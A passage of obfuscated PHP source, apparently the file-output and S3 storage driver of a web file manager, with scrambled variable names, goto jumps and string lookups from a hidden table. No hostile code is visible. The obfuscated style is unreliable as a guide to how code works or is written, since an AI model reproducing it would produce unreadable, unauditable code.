$bƒœÁÔ«å =& $_SERVER[´¬]; $this->cacheMethod(null, null); if (!$d£Å’±°«Î || !$this->exist($d£Å’±°«Î)) { show_json(LNG($bƒœÁÔ«å[105]), !1, $Eëæ¼ØÆ‚¥); } goto e¨ëÒ³»­œ; DÊ—Ô©†¯«: header($bƒœÁÔ«å[128]); header($bƒœÁÔ«å[129]); header($bƒœÁÔ«å[130]); goto d‹Å£¸µ¼¸; fÜãá¿š‡Í: $D”¼›ˆ©™í = 0; $a“ ´Ñ”ÉÏ = $d õœˆÓ‘Ã - 1; $dî‘ÀÙ‚Ñ® = $this->ext($FÄ«²Æœ´“); goto bÓ§³Ñ–ô; d‹Å£¸µ¼¸: if (isset($_SERVER[$bƒœÁÔ«å[131]]) && strtotime($_SERVER[$bƒœÁÔ«å[131]]) == $e×«·ÒéÙ›[$bƒœÁÔ«å[84]]) { header($bƒœÁÔ«å[132], !0, 304); die; } if (isset($_SERVER[$bƒœÁÔ«å[133]]) && $_SERVER[$bƒœÁÔ«å[133]] == $E­ğÕö·³) { header($bƒœÁÔ«å[134] . $E­ğÕö·³, !0, 304); die; } header($bƒœÁÔ«å[134] . $E­ğÕö·³); goto CÃ «Ø±–¬; CÃ «Ø±–¬: header($bƒœÁÔ«å[135] . $bÄÒ®…áÙ . $bƒœÁÔ«å[127]); header($bƒœÁÔ«å[136] . $FÄ«²Æœ´“); header($bƒœÁÔ«å[137]); goto Fí­Ô…‘–; aÚ¯ƒÎøßÑ: } public function fileOutServer($C²ôâÑ„ç÷, $Cñïªé°…Ú = false, $aù·¦ÎØË¢ = false, $AäŒƒ¤Ë•À = '') { $this->fileOut($C²ôâÑ„ç÷, $Cñïªé°…Ú, $aù·¦ÎØË¢, $AäŒƒ¤Ë•À); } public function fileOutLink($FöØ×Á†) { header($_SERVER[´¬][159] . $FöØ×Á†); die; } public function cacheMethod($dñÄÊ§¶, $eÙÖöÅùĞÄ, $D ¥¦Ê©ˆÌ = null) { goto C†»³‰Òô; A•™ŸãèÄ: $f„ÙäÛ­ = $this->{$dñÄÊ§¶}($eÙÖöÅùĞÄ); $bÀÚ‘Œ‰¢í[$f·“Ïõ±…ç] = $f„ÙäÛ­; return $f„ÙäÛ­; goto AÙÆõìÉèŠ; C†»³‰Òô: $cŞîšâÌÍˆ =& $_SERVER[´¬]; static $bÀÚ‘Œ‰¢í = array(); $b¥î—Ã©¶İ = $eÙÖöÅùĞÄ ? ltrim($this->getPathOuter($eÙÖöÅùĞÄ), $cŞîšâÌÍˆ[8]) : $eÙÖöÅùĞÄ; goto cÑ¼µ†Í±; cÑ¼µ†Í±: $f·“Ïõ±…ç = $cŞîšâÌÍˆ[160] . $dñÄÊ§¶ . $cŞîšâÌÍˆ[161] . rtrim($b¥î—Ã©¶İ, $cŞîšâÌÍˆ[8]); if (is_null($dñÄÊ§¶)) { $bÀÚ‘Œ‰¢í = array(); return; } if (is_null($eÙÖöÅùĞÄ)) { unset($bÀÚ‘Œ‰¢í[$f·“Ïõ±…ç]); return; } goto d×©èåô; d×©èåô: if (!is_null($D ¥¦Ê©ˆÌ)) { $bÀÚ‘Œ‰¢í[$f·“Ïõ±…ç] = $D ¥¦Ê©ˆÌ; return; } $f„ÙäÛ­ = isset($bÀÚ‘Œ‰¢í[$f·“Ïõ±…ç]) ? $bÀÚ‘Œ‰¢í[$f·“Ïõ±…ç] : null; if (!is_null($f„ÙäÛ­)) { return $f„ÙäÛ­; } goto A•™ŸãèÄ; AÙÆõìÉèŠ: } public function fileOutImage($f¿–‰°´ÚÖ, $b¤‰çÁÎ×ƒ = 250) { goto AòêÌÛŒ£±; AòêÌÛŒ£±: $bÒˆÛÏºÔ« =& $_SERVER[´¬]; set_timeout(); if (substr($f¿–‰°´ÚÖ, 0, 4) == $bÒˆÛÏºÔ«[147]) { $this->fileOutLink($f¿–‰°´ÚÖ); } goto bÂ÷ ¹„¶; E‰ÇìÑÇ×Û: del_file($b‡¬©µ§ï÷); IO::fileOut($f™ö»ÓéŒ„); goto b“Ó°Û„õ; FŞÙ®ÇÎ‚õ: if (!@file_exists($b‡¬©µ§ï÷)) { $eœİÃŞÁÉœ = TEMP_FILES; if (!is_dir($eœİÃŞÁÉœ)) { mk_dir($eœİÃŞÁÉœ); } $dÉØ—¼ëªŒ = $eœİÃŞÁÉœ . $D½ÉÜ‘ . $bÒˆÛÏºÔ«[95] . $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[168]]; if (!@file_exists($dÉØ—¼ëªŒ)) { $dÉØ—¼ëªŒ = $this->download($f¿–‰°´ÚÖ, $dÉØ—¼ëªŒ); } ImageThumb::createThumb($dÉØ—¼ëªŒ, $b‡¬©µ§ï÷, $b¤‰çÁÎ×ƒ, $b¤‰çÁÎ×ƒ * 10); } if (!file_exists($b‡¬©µ§ï÷) || filesize($b‡¬©µ§ï÷) < 100) { return @file_exists($dÉØ—¼ëªŒ) ? IO::fileOut($dÉØ—¼ëªŒ) : $this->fileOut($f¿–‰°´ÚÖ); } if (!($f™ö»ÓéŒ„ = IO::move($b‡¬©µ§ï÷, $FæéŠğÁ))) { return IO::fileOut($b‡¬©µ§ï÷); } goto E‰ÇìÑÇ×Û; b‘†µÎ®«: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $b‡¬©µ§ï÷ = DATA_THUMB . $Fæø¯œ‡ä; del_file($b‡¬©µ§ï÷); goto FŞÙ®ÇÎ‚õ; eğ¹ì÷Ş¿ª: $Fæø¯œ‡ä = "{$D½ÉÜ‘}\137{$b¤‰çÁÎ×ƒ}\x2e\160\x6e\x67"; if (!($fà±ºœ±áø = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $bÒˆÛÏºÔ«[172]))) { $FæéŠğÁ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $bÒˆÛÏºÔ«[173]); } else { $FæéŠğÁ = KodIO::make($fà±ºœ±áø); } if ($fà±ºœ±áø = IO::fileNameExist($FæéŠğÁ, $Fæø¯œ‡ä)) { $b‡¬©µ§ï÷ = KodIO::make($fà±ºœ±áø); return IO::fileOut($b‡¬©µ§ï÷, !1, $C­…¿Ä½Ô); } goto b‘†µÎ®«; bÂ÷ ¹„¶: $fÇÕòà¿—Í = $this->info($f¿–‰°´ÚÖ); $C­…¿Ä½Ô = $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[28]]; $dŒœÄ·ÔÆİ = !1; goto d¤—£†¹ƒ; d¤—£†¹ƒ: if (isset($GLOBALS[$bÒˆÛÏºÔ«[162]]) && $GLOBALS[$bÒˆÛÏºÔ«[162]][$bÒˆÛÏºÔ«[76]] == $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[76]]) { $aŒ®ĞóÍá§ = $GLOBALS[$bÒˆÛÏºÔ«[162]][$bÒˆÛÏºÔ«[163]]; if (!$fÇÕòà¿—Í[$bÒˆÛÏºÔ«[164]]) { $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[164]] = $GLOBALS[$bÒˆÛÏºÔ«[162]]; } if (isset($aŒ®ĞóÍá§[$bÒˆÛÏºÔ«[165]])) { if ($aŒ®ĞóÍá§[$bÒˆÛÏºÔ«[165]] <= $b¤‰çÁÎ×ƒ && $aŒ®ĞóÍá§[$bÒˆÛÏºÔ«[166]] <= $b¤‰çÁÎ×ƒ) { $dŒœÄ·ÔÆİ = !0; } } $C­…¿Ä½Ô = $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[164]][$bÒˆÛÏºÔ«[28]]; } if ($fÇÕòà¿—Í[$bÒˆÛÏºÔ«[78]] <= 1024 * 50 || $dŒœÄ·ÔÆİ || !function_exists($bÒˆÛÏºÔ«[167]) || $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[168]] == $bÒˆÛÏºÔ«[169]) { return $this->fileOut($f¿–‰°´ÚÖ, !1, $C­…¿Ä½Ô); } if (isset($fÇÕòà¿—Í[$bÒˆÛÏºÔ«[164]][$bÒˆÛÏºÔ«[170]])) { $D½ÉÜ‘ = $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[164]][$bÒˆÛÏºÔ«[170]]; } else { if (isset($fÇÕòà¿—Í[$bÒˆÛÏºÔ«[164]][$bÒˆÛÏºÔ«[171]])) { $D½ÉÜ‘ = $fÇÕòà¿—Í[$bÒˆÛÏºÔ«[164]][$bÒˆÛÏºÔ«[171]]; } else { $D½ÉÜ‘ = md5("{$fÇÕòà¿—Í[$bÒˆÛÏºÔ«[28]]}\x5f{$fÇÕòà¿—Í[$bÒˆÛÏºÔ«[76]]}\137{$fÇÕòà¿—Í[$bÒˆÛÏºÔ«[78]]}"); } } goto eğ¹ì÷Ş¿ª; b“Ó°Û„õ: } public function fileOutImageServer($CÜ‹ì¶ºÈÕ, $bÂÓ‚»´ÔÍ = 250) { $this->fileOutImage($CÜ‹ì¶ºÈÕ, $bÂÓ‚»´ÔÍ); } public function fileNameAuto($AÁ›ŠòªÛ‘, $f†ò‹‹³Úè, $B»‡•¬ÖËÆ = REPEAT_RENAME, $A‘©÷áøŠ = false) { goto DÄÛî¿àãÓ; DÄÛî¿àãÓ: $F• ‚¸»÷î =& $_SERVER[´¬]; $B¸«Şõ“©‘ = $AÁ›ŠòªÛ‘ === $F• ‚¸»÷î[33] ? $f†ò‹‹³Úè : rtrim($AÁ›ŠòªÛ‘, $F• ‚¸»÷î[8]) . $F• ‚¸»÷î[8] . $f†ò‹‹³Úè; if ($B»‡•¬ÖËÆ == REPEAT_REPLACE || !$this->exist($B¸«Şõ“©‘) || $A‘©÷áøŠ && $B»‡•¬ÖËÆ != REPEAT_RENAME_FOLDER) { return $f†ò‹‹³Úè; } goto C—Ô§¬Š¸©; eèŞ©ÂÅªó: while ($this->exist(rtrim($AÁ›ŠòªÛ‘, $F• ‚¸»÷î[8]) . $F• ‚¸»÷î[8] . $FÕÓ½íÔ¹)) { $FÕÓ½íÔ¹ = $C“¦Ó¿Ÿ°ë . "\x28{$Eòˆ„äŞ‚}\51{$cáÅ¢İĞ”Ë}"; $Eòˆ„äŞ‚++; } return $FÕÓ½íÔ¹; goto eóœÔîÙù; C—Ô§¬Š¸©: if ($B»‡•¬ÖËÆ == REPEAT_SKIP) { return !1; } $cáÅ¢İĞ”Ë = $F• ‚¸»÷î[95] . get_path_ext($f†ò‹‹³Úè); $cáÅ¢İĞ”Ë = $cáÅ¢İĞ”Ë == $F• ‚¸»÷î[95] || $A‘©÷áøŠ ? $F• ‚¸»÷î[33] : $cáÅ¢İĞ”Ë; goto D†ÖØŸ; D†ÖØŸ: $Eòˆ„äŞ‚ = 1; $C“¦Ó¿Ÿ°ë = substr($f†ò‹‹³Úè, 0, strlen($f†ò‹‹³Úè) - strlen($cáÅ¢İĞ”Ë)); $FÕÓ½íÔ¹ = $C“¦Ó¿Ÿ°ë . "\x28{$Eòˆ„äŞ‚}\x29{$cáÅ¢İĞ”Ë}"; goto eèŞ©ÂÅªó; eóœÔîÙù: } private function fileNameAutoList($A™Æ”¶Á‰º, $f‚÷»”Â, $f…£˜÷Ğ¬‹ = false) { goto D½¯ŞíÌâë; F¹ƒåƒ³®: $EÓ¬Ôçœ = array_to_keyvalue($aäáÎ™¤Â, $CÙ¹ªÖìì[33], $CÙ¹ªÖìì[28]); $DÉ”¡¢Òõ‚ = $CÙ¹ªÖìì[95] . get_path_ext($f‚÷»”Â); $DÉ”¡¢Òõ‚ = $DÉ”¡¢Òõ‚ == $CÙ¹ªÖìì[95] || $f…£˜÷Ğ¬‹ ? $CÙ¹ªÖìì[33] : $DÉ”¡¢Òõ‚; goto eâ§ˆŒÉ‘‰; eâ§ˆŒÉ‘‰: $bÃ†ƒ¯¨Ã™ = substr($f‚÷»”Â, 0, strlen($f‚÷»”Â) - strlen($DÉ”¡¢Òõ‚)); $E›ëíï›µÓ = $bÃ†ƒ¯¨Ã™ . "\x28\x30\51{$DÉ”¡¢Òõ‚}"; for ($B•ÆÖäÛ¯­ = 1; $B•ÆÖäÛ¯­ <= count($EÓ¬Ôçœ) + 1; $B•ÆÖäÛ¯­++) { $E›ëíï›µÓ = $bÃ†ƒ¯¨Ã™ . "\50{$B•ÆÖäÛ¯­}\x29{$DÉ”¡¢Òõ‚}"; if (!in_array_not_case($E›ëíï›µÓ, $EÓ¬Ôçœ)) { return $E›ëíï›µÓ; } } goto a™•­¹‰‚ë; a™•­¹‰‚ë: return $E›ëíï›µÓ; goto A„‰óŠ÷É; D½¯ŞíÌâë: $CÙ¹ªÖìì =& $_SERVER[´¬]; $aäáÎ™¤Â = $this->listPath($A™Æ”¶Á‰º, !0); $aäáÎ™¤Â = array_merge($aäáÎ™¤Â[$CÙ¹ªÖìì[75]], $aäáÎ™¤Â[$CÙ¹ªÖìì[74]]); goto F¹ƒåƒ³®; A„‰óŠ÷É: } public function listAllFiles($C¡àéÈêĞ, $cÍ‡œ–‡ÎŒ, $Cìõäİ«Ô = array()) { goto aà£ÁƒÅŒƒ; aà£ÁƒÅŒƒ: $bîÈ¨‘¹ø‡ =& $_SERVER[´¬]; if (empty($cÍ‡œ–‡ÎŒ)) { return array(); } $CŒ³•ÇŸî = array(); goto FÖÊØ¤èÍ‰; F×Ò“Š„¢–: foreach (array_unique($CŒ³•ÇŸî) as $CõõæŠ±Ô‘) { $F¦Ìİª–Û† = array($bîÈ¨‘¹ø‡[76] => $this->getPathOuter($bîÈ¨‘¹ø‡[8] . $C¡àéÈêĞ . $bîÈ¨‘¹ø‡[8] . $CõõæŠ±Ô‘), $bîÈ¨‘¹ø‡[77] => 1, $bîÈ¨‘¹ø‡[78] => 0); if (substr($CõõæŠ±Ô‘, -1) != $bîÈ¨‘¹ø‡[8]) { $F¦Ìİª–Û†[$bîÈ¨‘¹ø‡[77]] = 0; $F¥­áÌ‘šº = $this->getPath($C¡àéÈêĞ . $bîÈ¨‘¹ø‡[8] . $CõõæŠ±Ô‘); $F¦Ìİª–Û†[$bîÈ¨‘¹ø‡[78]] = isset($Cìõäİ«Ô[$F¥­áÌ‘šº]) ? $Cìõäİ«Ô[$F¥­áÌ‘šº] : $this->size($F¥­áÌ‘šº); } $D½Õ¡ŒÖƒØ[] = $F¦Ìİª–Û†; } return $D½Õ¡ŒÖƒØ; goto cÆ‚åìÉè†; FÖÊØ¤èÍ‰: $C¡àéÈêĞ = trim($C¡àéÈêĞ, $bîÈ¨‘¹ø‡[8]); foreach ($cÍ‡œ–‡ÎŒ as $CõõæŠ±Ô‘) { $fóØ„–‡ñå = ltrim(substr(trim($CõõæŠ±Ô‘, $bîÈ¨‘¹ø‡[8]), strlen($C¡àéÈêĞ)), $bîÈ¨‘¹ø‡[8]); $CŒ³•ÇŸî = array_merge($CŒ³•ÇŸî, $this->slicePath($fóØ„–‡ñå)); } $D½Õ¡ŒÖƒØ = array(); goto F×Ò“Š„¢–; cÆ‚åìÉè†: } public function slicePath($fóÃîàëÅ) { $CªÄÊ“¦ =& $_SERVER[´¬]; $CÈš§Ì¥ãç = explode($CªÄÊ“¦[8], trim($fóÃîàëÅ, $CªÄÊ“¦[8])); $CØĞëÚÓÇå = 0; do { ++$CØĞëÚÓÇå; $f¬ˆÍß±¤æ[] = implode($CªÄÊ“¦[8], array_slice($CÈš§Ì¥ãç, 0, $CØĞëÚÓÇå)) . $CªÄÊ“¦[8]; } while ($CØĞëÚÓÇå < count($CÈš§Ì¥ãç)); $f¬ˆÍß±¤æ[count($CÈš§Ì¥ãç) - 1] = $fóÃîàëÅ; return $f¬ˆÍß±¤æ; } public function getHost() { $c¾¥„ÜÁ‡Œ =& $_SERVER[´¬]; $BÒÄ‘¡® = parse_url(trim($this->domain, $c¾¥„ÜÁ‡Œ[8])); $Dª‰Ÿ½Î× = isset($BÒÄ‘¡®[$c¾¥„ÜÁ‡Œ[174]]) ? $BÒÄ‘¡®[$c¾¥„ÜÁ‡Œ[174]] : http_type(); $Eß©·êˆÙƒ = isset($BÒÄ‘¡®[$c¾¥„ÜÁ‡Œ[175]]) ? $BÒÄ‘¡®[$c¾¥„ÜÁ‡Œ[175]] : $BÒÄ‘¡®[$c¾¥„ÜÁ‡Œ[76]]; if (isset($BÒÄ‘¡®[$c¾¥„ÜÁ‡Œ[176]])) { $Eß©·êˆÙƒ .= $c¾¥„ÜÁ‡Œ[4] . $BÒÄ‘¡®[$c¾¥„ÜÁ‡Œ[176]]; } return $Dª‰Ÿ½Î× . $c¾¥„ÜÁ‡Œ[177] . $Eß©·êˆÙƒ; } public function pathEncode($C‹á•î§) { $c£¶§Æ§Ö =& $_SERVER[´¬]; return str_replace($c£¶§Æ§Ö[178], $c£¶§Æ§Ö[8], rawurlencode($C‹á•î§)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($bÏì„ƒÏ˜) { set_timeout(); require_once SDK_DIR . $_SERVER[´¬][179]; parent::__construct(); $this->_init($bÏì„ƒÏ˜); } public function _init($f†ÎµğŸƒ†) { foreach ($f†ÎµğŸƒ† as $fÔÕ‰—ÎƒÏ => $DÊ®£çÊİ¦) { if (isset($this->{$fÔÕ‰—ÎƒÏ})) { $this->{$fÔÕ‰—ÎƒÏ} = $DÊ®£çÊİ¦; } } $this->endpoint = $f†ÎµğŸƒ†[$_SERVER[´¬][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($AàäÔÂ¼À = "\166\64") { $this->signVer = $AàäÔÂ¼À; $this->client->setSignatureVersion($AàäÔÂ¼À); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto f„ŠàË¢áÅ; f„ŠàË¢áÅ: $b¾®á¶©Üó =& $_SERVER[´¬]; $b‚²«í„±Ç = $this->getBucketCors(); if (!$b‚²«í„±Ç || !is_array($b‚²«í„±Ç)) { return !1; } goto d“Š«Ñ’Ê; d“Š«Ñ’Ê: if ($b‚²«í„±Ç[$b¾®á¶©Üó[181]] != $b¾®á¶©Üó[182] || $b‚²«í„±Ç[$b¾®á¶©Üó[183]] != $b¾®á¶©Üó[182]) { return !1; } $C‡šÓ·¾ºì = array_map($b¾®á¶©Üó[184], $b‚²«í„±Ç[$b¾®á¶©Üó[185]]); if (!is_array($C‡šÓ·¾ºì)) { $C‡šÓ·¾ºì = array(); } goto A÷éÊÄæå®; A÷éÊÄæå®: $e¿è×Íººæ = array($b¾®á¶©Üó[186], $b¾®á¶©Üó[187], $b¾®á¶©Üó[188], $b¾®á¶©Üó[189], $b¾®á¶©Üó[190]); $CÙÀôåœòã = array_diff($e¿è×Íººæ, $C‡šÓ·¾ºì); return empty($CÙÀôåœòã); goto A¶ÄÒ‘•¥Î; A¶ÄÒ‘•¥Î: } public function mkfile($A“ØÑ‰—ÍÕ, $Cƒ…¦³ˆ³ = '', $D‹†Ï‘Ä«Ä = REPEAT_RENAME) { $FÃ›ˆ¶ãÄ’ = $this->setContent($A“ØÑ‰—ÍÕ, $Cƒ…¦³ˆ³); if ($FÃ›ˆ¶ãÄ’ !== !1) { return $this->getPathOuter($A“ØÑ‰—ÍÕ); } return !1; } public function mkdir($Aî„ãÜİğä, $dÄ¡ˆ›´©Õ = REPEAT_SKIP) { if (empty($Aî„ãÜİğä)) { return !1; } if ($this->_isFolder($Aî„ãÜİğä)) { return $this->getPathOuter($Aî„ãÜİğä); } $D‰à´ãõ³ë = $this->setContent($Aî„ãÜİğä, $_SERVER[´¬][33], !0); if ($D‰à´ãõ³ë !== !1) { return $this->getPathOuter($Aî„ãÜİğä); } return !1; } public function copyFile($d¢ÛÃ–¥å, $AÈØ×‚ß˜, $E½â×Ì†¢· = array()) { $aÁó·¬¼ªè =& $_SERVER[´¬]; $fù›»°¼ŠÛ = $this->objectMeta($d¢ÛÃ–¥å); if (!$fù›»°¼ŠÛ) { return !1; } if ($fù›»°¼ŠÛ[$aÁó·¬¼ªè[78]] <= 1024 * 1024 * 200) { $aÎØÓ®Ê¹ = $this->client->copyObject($this->bucket, $d¢ÛÃ–¥å, $this->bucket, $AÈØ×‚ß˜, $aÁó·¬¼ªè[191], $E½â×Ì†¢·); } else { $aÎØÓ®Ê¹ = $this->client->multiCopyObject($this->bucket, $d¢ÛÃ–¥å, $this->bucket, $AÈØ×‚ß˜, $E½â×Ì†¢·); } $aÎØÓ®Ê¹ = $aÎØÓ®Ê¹ ? $this->getPathOuter($AÈØ×‚ß˜) : !1; return $aÎØÓ®Ê¹; } public function moveFile($bå¾µõâ÷Ñ, $fòÎí™Çİ‹) { if ($this->copyFile($bå¾µõâ÷Ñ, $fòÎí™Çİ‹)) { $this->delFile($bå¾µõâ÷Ñ); return $this->getPathOuter($fòÎí™Çİ‹); } return !1; } public function delFile($FñÇ’Ö«Ü») { return $this->client->deleteObject($this->bucket, $FñÇ’Ö«Ü»); } public function delFolder($EºÌ„íé§Ş) { goto Aƒ±šßÑ; dÚÔ“ò„’: return $this->delByBatch($b¦§“Î¹Ë[$dë÷Œ¼¡åœ[75]]); goto CòŠÜ¨¥İÊ; Aƒ±šßÑ: $dë÷Œ¼¡åœ =& $_SERVER[´¬]; if (!$this->exist($EºÌ„íé§Ş)) { return !0; } $this->listItemCache = !1; goto Eù¢ÅŸ—š; e¨ğÙï¿†Ÿ: if (!empty($EºÌ„íé§Ş) && !in_array($aÆøÃªÜõ, $b¦§“Î¹Ë[$dë÷Œ¼¡åœ[75]])) { $b¦§“Î¹Ë[$dë÷Œ¼¡åœ[75]][] = $aÆøÃªÜõ; } $DÛá¦“«­Ä = $this->delByBatch($b¦§“Î¹Ë[$dë÷Œ¼¡åœ[74]]); if (!$DÛá¦“«­Ä) { return !1; } goto dÚÔ“ò„’; Eù¢ÅŸ—š: $b¦§“Î¹Ë = $this->fileList($EºÌ„íé§Ş); $this->listItemCache = !0; $aÆøÃªÜõ = trim($EºÌ„íé§Ş, $dë÷Œ¼¡åœ[8]) . $dë÷Œ¼¡åœ[8]; goto e¨ğÙï¿†Ÿ; CòŠÜ¨¥İÊ: } private function delByBatch($F„Âªò¶®Ä) { foreach (array_chunk($F„Âªò¶®Ä, 1000) as $d¨«õĞÓõ) { $cô¹¸î¢ÎÈ = $this->client->deleteObjects($this->bucket, $d¨«õĞÓõ); if (!$cô¹¸î¢ÎÈ) { return !1; } } return !0; } public function rename($F¦î™À³‡ó, $e™êªÎŒê²) { return $this->renameObject($F¦î™À³‡ó, $e™êªÎŒê²); } public function listPath($f¼œ¼óøµÒ, $cÆÕôïÂ°Ä = false) { $còªŒáƒöù =& $_SERVER[´¬]; $CÄÅĞ“·ø = $this->fileList($f¼œ¼óøµÒ, $còªŒáƒöù[8], !0); foreach ($CÄÅĞ“·ø[$còªŒáƒöù[75]] as $fèöˆš„Ğ£ => $B¿ó“Ú×ë¦) { $CÄÅĞ“·ø[$còªŒáƒöù[75]][$fèöˆš„Ğ£] = $this->folderInfo($B¿ó“Ú×ë¦, $cÆÕôïÂ°Ä); } foreach ($CÄÅĞ“·ø[$còªŒáƒöù[74]] as $fèöˆš„Ğ£ => $B¿ó“Ú×ë¦) { $CÄÅĞ“·ø[$còªŒáƒöù[74]][$fèöˆš„Ğ£] = $this->fileInfo($B¿ó“Ú×ë¦[$còªŒáƒöù[28]], $cÆÕôïÂ°Ä, $B¿ó“Ú×ë¦); } return $CÄÅĞ“·ø; } private function fileInfo($Cœ«ãœ, $BÃµãäÈ—Í = false, $AÚÖÌ§ŞÍÄ = array()) { goto fÂç¤È§Œ¡; Dİ‘‹¥Àç¾: $A„‡Æêæ…[$fÀŞğĞÉ¬[193]] = $A„‡Æêæ…[$fÀŞğĞÉ¬[84]] = 0; $A„‡Æêæ…[$fÀŞğĞÉ¬[194]] = $A„‡Æêæ…[$fÀŞğĞÉ¬[195]] = !0; if (empty($AÚÖÌ§ŞÍÄ)) { $AÚÖÌ§ŞÍÄ = $this->objectMeta($Cœ«ãœ); if (!$AÚÖÌ§ŞÍÄ) { return $A„‡Æêæ…; } } goto aÀ¢­ÁšˆÊ; aÀ¢­ÁšˆÊ: if (isset($AÚÖÌ§ŞÍÄ[$fÀŞğĞÉ¬[196]])) { $A„‡Æêæ…[$fÀŞğĞÉ¬[84]] = $AÚÖÌ§ŞÍÄ[$fÀŞğĞÉ¬[196]]; } if (isset($AÚÖÌ§ŞÍÄ[$fÀŞğĞÉ¬[78]])) { $A„‡Æêæ…[$fÀŞğĞÉ¬[78]] = $AÚÖÌ§ŞÍÄ[$fÀŞğĞÉ¬[78]]; } return $A„‡Æêæ…; goto déç“´ø‘Š; fÂç¤È§Œ¡: $fÀŞğĞÉ¬ =& $_SERVER[´¬]; $A„‡Æêæ… = array($fÀŞğĞÉ¬[28] => $this->pathThis($Cœ«ãœ), $fÀŞğĞÉ¬[76] => $this->getPathOuter($Cœ«ãœ), $fÀŞğĞÉ¬[29] => $fÀŞğĞÉ¬[192], $fÀŞğĞÉ¬[168] => $this->ext($Cœ«ãœ), $fÀŞğĞÉ¬[78] => isset($AÚÖÌ§ŞÍÄ[$fÀŞğĞÉ¬[78]]) ? $AÚÖÌ§ŞÍÄ[$fÀŞğĞÉ¬[78]] : 0); if ($BÃµãäÈ—Í) { return $A„‡Æêæ…; } goto Dİ‘‹¥Àç¾; déç“´ø‘Š: } private function folderInfo($CÑÊ©¼‹ò˜, $DÓˆ©’ÔÀ = false) { goto FÒ‡«çò; cæ¨ìÛ‡ø‘: $A‚Ò…Õ‡£É[$Bë˜–¹‘[193]] = $A‚Ò…Õ‡£É[$Bë˜–¹‘[84]] = 0; $A‚Ò…Õ‡£É[$Bë˜–¹‘[194]] = $A‚Ò…Õ‡£É[$Bë˜–¹‘[195]] = !0; if ($CÑÊ©¼‹ò˜ == $Bë˜–¹‘[33]) { return $A‚Ò…Õ‡£É; } goto CòÅğö ˆ; FÒ‡«çò: $Bë˜–¹‘ =& $_SERVER[´¬]; $A‚Ò…Õ‡£É = array($Bë˜–¹‘[28] => $this->pathThis($CÑÊ©¼‹ò˜), $Bë˜–¹‘[76] => $this->getPathOuter($Bë˜–¹‘[8] . $CÑÊ©¼‹ò˜), $Bë˜–¹‘[29] => $Bë˜–¹‘[77]); if ($DÓˆ©’ÔÀ) { return $A‚Ò…Õ‡£É; } goto cæ¨ìÛ‡ø‘; CòÅğö ˆ: $CÑÊ©¼‹ò˜ = trim($CÑÊ©¼‹ò˜, $Bë˜–¹‘[8]) . $Bë˜–¹‘[8]; $FªäâÂ¼ = $this->objectMeta($CÑÊ©¼‹ò˜); if (isset($FªäâÂ¼[$Bë˜–¹‘[196]])) { $A‚Ò…Õ‡£É[$Bë˜–¹‘[193]] = $FªäâÂ¼[$Bë˜–¹‘[196]]; } goto b©¹°ª‰’°; b©¹°ª‰’°: return $A‚Ò…Õ‡£É; goto B½¸—¿É–Ê; B½¸—¿É–Ê: } private function fileList($AÓÉÇáÍƒ, $FÄ±Æ‚Òº = '', $f“å¾ó½Ó° = 0) { goto bš›ùÂâÔ; FåÀ×‘¦§: if (!$AÇ¿™ÕÀÏ) { return array($F„ºÜ¢´Û¦[75] => array(), $F„ºÜ¢´Û¦[74] => array()); } $dºîëëœ·ô = $this->listItemCache === !1 ? !1 : !0; $FÖÕš×ëœ» = $D…ì¶ŸÙ† = array(); goto c¸ˆÈ…º‚­; C…Åì“–‡: return array($F„ºÜ¢´Û¦[75] => $FÖÕš×ëœ», $F„ºÜ¢´Û¦[74] => $D…ì¶ŸÙ†); goto Féå‹åéÔË; bš›ùÂâÔ: $F„ºÜ¢´Û¦ =& $_SERVER[´¬]; $BÍ¶Œèãïß = rtrim($AÓÉÇáÍƒ, $F„ºÜ¢´Û¦[8]) . $F„ºÜ¢´Û¦[8]; $AÇ¿™ÕÀÏ = $this->listObjs($BÍ¶Œèãïß, null, null, $FÄ±Æ‚Òº); goto FåÀ×‘¦§; c¸ˆÈ…º‚­: foreach ($AÇ¿™ÕÀÏ[$F„ºÜ¢´Û¦[197]] as $aëöÇšÈ¤) { goto f¨˜ËÑ‡¸ê; f¨˜ËÑ‡¸ê: $Aï”öòˆ‡ = $aëöÇšÈ¤[$F„ºÜ¢´Û¦[28]]; if ($Aï”öòˆ‡ == $BÍ¶Œèãïß) { continue; } $bÖØ“ğ±­ñ = isset($aëöÇšÈ¤[$F„ºÜ¢´Û¦[78]]) ? $aëöÇšÈ¤[$F„ºÜ¢´Û¦[78]] : 0; goto eË©—ßÉœÉ; eË©—ßÉœÉ: $aË¼ºŸõÅ¼ = $bÖØ“ğ±­ñ == 0 && substr($Aï”öòˆ‡, strlen($Aï”öòˆ‡) - 1, 1) == $F„ºÜ¢´Û¦[8] ? !0 : !1; if ($dºîëëœ·ô) { $this->cacheMethod($F„ºÜ¢´Û¦[198], $Aï”öòˆ‡, $aË¼ºŸõÅ¼); $this->cacheMethod($F„ºÜ¢´Û¦[199], $Aï”öòˆ‡, $aëöÇšÈ¤); } if ($aË¼ºŸõÅ¼) { $FÖÕš×ëœ»[] = $Aï”öòˆ‡; continue; } goto AÁ¦§ÇÓà; AÁ¦§ÇÓà: $D…ì¶ŸÙ†[] = $f“å¾ó½Ó° ? $aëöÇšÈ¤ : $Aï”öòˆ‡; goto dÀ»ƒ™ïªˆ; dÀ»ƒ™ïªˆ: } foreach ($AÇ¿™ÕÀÏ[$F„ºÜ¢´Û¦[200]] as $aëöÇšÈ¤) { $FÖÕš×ëœ»[] = $aëöÇšÈ¤[$F„ºÜ¢´Û¦[28]]; if ($dºîëëœ·ô) { 